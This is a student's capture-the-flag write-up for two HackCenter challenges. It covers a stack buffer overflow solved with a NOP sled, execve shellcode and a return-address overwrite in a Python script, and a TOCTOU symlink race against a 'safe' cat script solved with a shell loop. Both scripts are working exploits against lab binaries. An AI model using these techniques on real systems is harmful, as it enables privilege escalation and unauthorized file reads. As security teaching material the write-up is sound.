# HackCenter Write Up
by Tilden Jackson (thjackso)
## Contents
* **[Overflowme](#overflowme)**
* **[safecat3](#safecat3)**

## Overflowme
We are asked the following:
>There is a vulnerable service running on shell.hackcenter.dbrumley.com:54236. Exploit it and read the contents of  **key**  on the shell server. The  [binary](https://hackcenter.dbrumley.com/problems/f22e5556fd40d8f57f3bed2489014172/overflowme)  and  [its source](https://hackcenter.dbrumley.com/problems/f22e5556fd40d8f57f3bed2489014172/overflowme.c)  are also available in /problems/5f43b170468963298f74950d92135b87 on the shellserver.
\
HINTS
Have you heard of buffer overflows?
Here's a shellcode for you:  
`\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80`
Stack addresses may differ in gdb.
ASLR is disabled

This gives us a lot of helpful hints. We know that we will be able to overflow a buffer to inject our own values and we are even given a shell script code that we can inject. 

The overflowme.c source code is relatively simple and we can readily identify the vulnerability in read which will allow us to write in 443 characters of our own values into the buffer that is only 379 bytes long. However, this only leaves us with 64bytes to work with. This is enough for our shell script but not much more.
```
void vuln() {                                                           
    puts("What is your name?");                                         
    fflush(stdout);                                                     
    char buf[379];                                                      
    strcpy(buf, "Hello ");                                              
    while (read(0, &c, 1) > 0 && c!='\n' && i < 443u) {                 
      buf[i++] = c;                                                     
    }                                                                   
    buf[i] = '\x00';                                                    
                                                                        
    puts(buf);                                                          
    fflush(stdout);                                                     
    return;                                                             
}                                                                       
                                                                        
void be_nice_to_people(){                                               
    gid_t gid = getegid();                                              
    setresgid(gid, gid, gid);                                           
}                                                                       
                                                                        
int main(int argc, char **argv) {                                       
                                                                        
    be_nice_to_people();                                                
    vuln();                                                             
    return 0;                                                           
                                                                        
} 
```

Since ASLR is disabled we can just look at the absolute address of the buffer and inject that address into the return address of the function to use a ret2buf attack where we store our shellcode in the buffer.

The address of the buffer is `0xffffd395` but since we are a little uncertain we will use a nop slide and guess the address to be the middle of the nop slide incase we miss. 

To understand the `<vuln>` function better we will look at the disassembled code
```
Dump of assembler code for function vuln:
   0x08049196 <+0>:     push   ebp
   0x08049197 <+1>:     mov    ebp,esp
   0x08049199 <+3>:     sub    esp,0x188
   ...
   0x080491c0 <+42>:    lea    eax,[ebp-0x183]
   0x080491c6 <+48>:    mov    DWORD PTR [eax],0x6c6c6548
   0x080491cc <+54>:    mov    DWORD PTR [eax+0x3],0x206f6c
   0x080491d3 <+61>:    jmp    0x80491f1 <vuln+91>
   ...
   0x080491fd <+103>:   call   0x8049040 <read@plt>
   0x08049202 <+108>:   add    esp,0x10
   0x08049205 <+111>:   test   eax,eax
   0x08049207 <+113>:   jle    0x8049220 <vuln+138>
   0x08049209 <+115>:   movzx  eax,BYTE PTR ds:0x804c029
   0x08049210 <+122>:   cmp    al,0xa
   0x08049212 <+124>:   je     0x8049220 <vuln+138>
   0x08049214 <+126>:   mov    eax,ds:0x804c020
   0x08049219 <+131>:   cmp    eax,0x1ba
   0x0804921e <+136>:   jbe    0x80491d5 <vuln+63>
   ...
```
From the disassembly of the vuln function we see that the buf is at `-0x183(ebp)` however since `Hello ` is already stored in there we actually start writing in a little higher. We must keep this in mind for where the return address is. The return address is 385 bytes from the buffer where we start writing or `0x181` this comes from `0x183 (buf base addr) - 6 ("Hello ") + 4 (push ebp)`. Now we know all we need to overflow and we can exploit as shown with the script below:

**Automated Solve Script**:
```
#!/usr/bin/env/python3
# file: exploit.py

import struct
import subprocess

binary_file = "/problems/5f43b170468963298f74950d92135b87/overflowme_no_aslr"

ret_addr = (0xffffd395 + 100)
nop_slide = b"\x90"*(300)
shellcode = b"\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"
pad = b"a"*(385-(len(shellcode)+len(nop_slide)))
exploit = nop_slide + shellcode + pad + struct.pack("<I",ret_addr)

bash_command = b"/bin/cat /problems/5f43b170468963298f74950d92135b87/key"

subprocess.run(binary_file, input=exploit+b"\n"+bash_command)
```

## Safecat3
We are asked the following:
>Alright, that's it! I believe we finally managed to make it secure! Good luck hacking around  [safecat3.sh](https://hackcenter.dbrumley.com/problems/c4f3d7d639b82e514e12b224df899bef/safecat3.sh)  (also under /problems/7329e2b6ebeb17689bb9782845f90c05). We're safe this time.
\
HINTS:
Do you know what TOCTOU stands for?

In this vulnerable shellscript the author has learned from his mistakes and "resecured" the shellscript by using absolute paths for all of the library calls so we cannot do what we did in [safecat2](#safecat2) and subvert this by writing our own library versions of the function.

However, the function is has a TOCTOU  (Time of Check Time of Usage) vulnerablity. By quickly changing the symbolic link between a link that is valid and passes one of the checks -- `case "$path" in
  /tmp/* | /proc/* | /var/*)
    /bin/cat "$1";;
  *)` -- and a link that points to the file that we want to access `flag.txt` we can get the "safe" cat script to read the flag.txt to us with its elevated permissions.

**Automated Solve Script**:
```
#!/bin/sh


/problems/7329e2b6ebeb17689bb9782845f90c05/safecat /home/thjackso/exploit_link &

while true; do
        ln -sf /problems/7329e2b6ebeb17689bb9782845f90c05/flag /home/thjackso/exploit_link
        ln -sf /var/www/html/index.nginx-debian.html /home/thjackso/exploit_link
done
```
